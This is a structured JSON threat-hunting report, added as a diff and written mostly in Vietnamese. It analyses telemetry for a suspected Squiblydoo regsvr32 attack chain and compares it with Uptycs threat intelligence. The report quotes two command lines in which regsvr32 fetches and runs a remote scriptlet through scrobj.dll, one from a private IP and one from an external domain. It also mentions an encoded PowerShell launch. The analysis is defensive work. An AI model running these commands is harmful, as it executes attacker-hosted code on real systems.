@@ -1,0 +1,67 @@
+{
+  "schema_version": "threat-hunting-report/v1",
+  "verdict": "SUSPICIOUS",
+  "direct_answer": "Telemetry địa phương hỗ trợ nghi vấn Squiblydoo ở mức hành vi: regsvr32.exe được tạo bởi powershell.exe với command line chứa /s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll (jsonl:line:97, jsonl:line:219), giữ nguyên /n; sau đó regsvr32.exe tạo powershell.exe (jsonl:line:224, jsonl:line:283) và có một kết nối Sysmon Event ID 3 từ regsvr32.exe tới 10.10.10.5:8444 (jsonl:line:1001). CTI Uptycs chỉ là bối cảnh bên ngoài mô tả kỹ thuật Squiblydoo và ví dụ có /s /n /u, /i HTTP, scrobj.dll (uptycs-regsvr32, text:chars:5618:6067); CTI không chứng minh compromise, hoàn tất HTTP hay C2 trên host. Không có bằng chứng remote UNC share trong context này.",
+  "executive_summary": "Đối chiếu được thực hiện trên hai lớp tách biệt: telemetry địa phương (process creation, command line, network connection) và CTI Uptycs (publisher context). Điểm tương đồng là mẫu regsvr32 với /s /n /u, /i HTTP và scrobj.dll; điểm khác biệt là telemetry địa phương dùng URL http://10.10.10.5:8444/launcher.sct còn ví dụ Uptycs dùng http://lyncdiscover.2bunny.com/Autodiscover. Các kết quả như hoàn tất tải/HTTP, thực thi scriptlet, mục đích C2 và remote UNC share chưa được chứng minh.",
+  "technical_analysis": "Telemetry địa phương: powershell.exe (PID 8648, chỉ có trong parent fields) tạo regsvr32.exe (PID 9384) theo Sysmon Event ID 1 tại jsonl:line:97 và Security 4688 tại jsonl:line:219; command line quan sát được là \"C:\\windows\\system32\\regsvr32.exe\" /s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll, giữ nguyên /n. regsvr32.exe (PID 9384) tạo powershell.exe (PID 9076) theo Sysmon Event ID 1 tại jsonl:line:224 và Security 4688 tại jsonl:line:283; powershell.exe này có command line -noP -sta -w 1 -enc <base64>. Kết nối mạng: Sysmon Event ID 3 tại jsonl:line:1001 ghi nhận regsvr32.exe (PID 9384, GUID {b59756a9-b238-5f17-5207-000000000400}) kết nối tới 10.10.10.5:8444; đây là network connection/endpoint theo fields, không chứng minh HTTP exchange hoàn tất, nội dung truyền hay số byte. CTI Uptycs (publisher: Uptycs, URL https://www.uptycs.com/blog/threat-research-report-team/attackers-increasingly-adopting-regsvr32-utility-execution-via-office-documents, publication_date 2022-02-09T16:43:52.000Z): publisher_excerpt mô tả regsvr32 nạp COM scriptlet để thực thi DLL, gọi là Squiblydoo, và ví dụ \"regsvr32.exe\" /s /n /u /i:http://lyncdiscover.2bunny.com/Autodiscover scrobj.dll (text:chars:5618:6067); publisher_excerpt thứ hai mô tả Uptycs EDR phát hiện thực thi regsvr32 đáng ngờ với quan hệ parent/child (text:chars:7191:7484). So sánh: tương đồng ở việc dùng regsvr32 với /s /n /u, /i HTTP và scrobj.dll; khác biệt ở URL đích (10.10.10.5:8444/launcher.sct so với lyncdiscover.2bunny.com/Autodiscover) và ở việc telemetry địa phương có thêm chuỗi parent/child powershell → regsvr32 → powershell cùng kết nối port 8444. Không thể so sánh các chiều như nội dung scriptlet, hoàn tất tải, mục đích C2 hay remote UNC share vì context không cung cấp. Khoảng dấu thời gian canonical của các observations được chọn là 2020-07-22T03:27:53.548000Z đến 2020-07-22T03:28:28.429000Z; đây không phải thời lượng thực tế của tấn công và không chứng minh đồng bộ đồng hồ giữa các nguồn.",
+  "attack_chain": [
+    {
+      "step_number": 1,
+      "source_entity": "powershell.exe PID 8648 (chỉ có trong parent fields)",
+      "action": "process_spawn",
+      "target_entity": "regsvr32.exe PID 9384",
+      "evidence_ref": "jsonl:line:97",
+      "timestamp": "2020-07-22T03:27:53.548000Z"
+    },
+    {
+      "step_number": 2,
+      "source_entity": "regsvr32.exe PID 9384",
+      "action": "process_spawn",
+      "target_entity": "powershell.exe PID 9076",
+      "evidence_ref": "jsonl:line:224",
+      "timestamp": "2020-07-22T03:27:54.604000Z"
+    },
+    {
+      "step_number": 3,
+      "source_entity": "regsvr32.exe PID 9384",
+      "action": "network_connect",
+      "target_entity": "10.10.10.5:8444",
+      "evidence_ref": "jsonl:line:1001",
+      "timestamp": "2020-07-22T03:27:55.955000Z"
+    }
+  ],
+  "mitre_mappings": [
+    {
+      "technique_id": "T1218.010",
+      "technique_name": "Regsvr32",
+      "confidence": "supported_by_observed_behavior",
+      "rationale": "HTTP scriptlet regsvr32 command and parent/child evidence support suspected system binary proxy execution. Network endpoints do not prove C2 purpose.",
+      "evidence_support": "supported_by_observed_behavior",
+      "assessment_status": "candidate",
+      "review_status": "needs_review"
+    }
+  ],
+  "sigma_matches": [
+    "2dd2c217-bf68-437a-b57c-fe9fd01d5de8",
+    "6f0947a4-1c5e-4e0d-8ac7-53159b8f23ca",
+    "ab37a6ec-6068-432b-a64e-2c7bf95b1d22"
+  ],
+  "containment_recommendations": [],
+  "unverified_claims": [
+    "Không chứng minh HTTP exchange hoàn tất, nội dung truyền, số byte hay exfiltration từ kết nối regsvr32.exe tới 10.10.10.5:8444 (jsonl:line:1001).",
+    "Không chứng minh scriptlet được thực thi hoàn tất hay cmdlet PowerShell hoàn tất/cho output; process creation chỉ chứng minh việc tạo process.",
+    "Không chứng minh mục đích C2 của kết nối; assessment nguồn ghi suspicious_network_context_not_confirmed_C2.",
+    "Không có bằng chứng remote UNC share trong context này; không suy remote UNC share từ command line hay kết nối.",
+    "CTI Uptycs là bối cảnh bên ngoài, không chứng minh compromise hay actor attribution trên host.",
+    "Khoảng dấu thời gian canonical 2020-07-22T03:27:53.548000Z–2020-07-22T03:28:28.429000Z không phải thời lượng thực tế của tấn công và không chứng minh đồng bộ đồng hồ giữa các nguồn."
+  ],
+  "evidence_refs": [
+    "jsonl:line:97",
+    "jsonl:line:219",
+    "jsonl:line:224",
+    "jsonl:line:283",
+    "jsonl:line:1001",
+    "text:chars:5618:6067",
+    "text:chars:7191:7484"
+  ]
+}
